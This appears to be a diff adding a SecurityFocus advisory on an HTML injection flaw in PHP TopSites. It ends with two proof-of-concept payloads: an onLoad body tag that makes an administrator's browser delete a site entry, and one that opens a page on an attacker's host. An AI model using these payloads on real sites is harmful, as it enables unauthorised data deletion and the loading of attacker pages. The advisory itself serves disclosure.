@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/6621/info
+
+An HTML injection vulnerability has been discovered in PHP TopSites. The issue occurs due to insufficient sanitization of user-supplied data. By injecting HTML code into the <body> tag of the description page, when submitting website, it may be possible to cause an administrator to edit or delete database entries.
+
+This issue will occur when an unsuspecting administrator loads the submitted description.
+
+This vulnerability has also been reported to affect the 'edit.php' script.
+
+<body
+onLoad= "parent.location='http://www.somewebsite.com/TopSitesdirectory/seditor.php?
+sid=siteidnumber&a=delete'">
+<body onLoad="window.open('http://attackerswebsite/launcher.htm')">
